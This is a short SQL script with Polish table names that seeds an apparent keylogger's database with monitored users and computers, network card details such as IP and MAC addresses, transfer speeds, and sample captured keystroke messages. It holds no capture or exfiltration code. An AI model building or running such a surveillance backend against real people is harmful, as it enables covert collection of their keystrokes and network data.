insert into Uzytkownicy_Keylogger (Nazwa_Komputera,Nazwa_Uzytkownika_Na_Komputerze)
values ('Zielony','Mateusz'),('PC-Laptop','Michal'),('Pc','Iwona');

insert into Uzytkownicy_Keylogger (Nazwa_Komputera,Nazwa_Uzytkownika_Na_Komputerze,opis)
values ('Kolega','Kamil',':)');

insert into Transfer_Obecny (ID_Uzytkownicy_Keylogger,Predkosc_Wysylania,Predkosc_Pobiernia,kiedy_rozpoczeto_pomiar)
values (1,5,50,NOW()),(2,0,10,NOW()),(3,null,150,NOW()),(4,null,180,NOW());

insert into Informacje_O_Karcie_Sieciowej (ID_Uzytkownicy_Keylogger,Ineterface,Mac,IP,Maska,Broadcast,kiedy_Zebrano_Informacje)
values (2,'Wi-fi1','00:00','192.168.1.25','255.255.255.0','255.255.255.254',now()),(3,'Wi-fi5','00:01','192.168.1.32','255.255.255.0','255.255.255.254',now());

insert into Keylogger_Wiadomosci (ID_Uzytkownicy_Keylogger,Wiadomosc,kiedy_Zebrano_wiadomosc)
values(1,'Szukam pracy',now()),(2,'Test231',now()),(3,'Cs rozgrywki',now());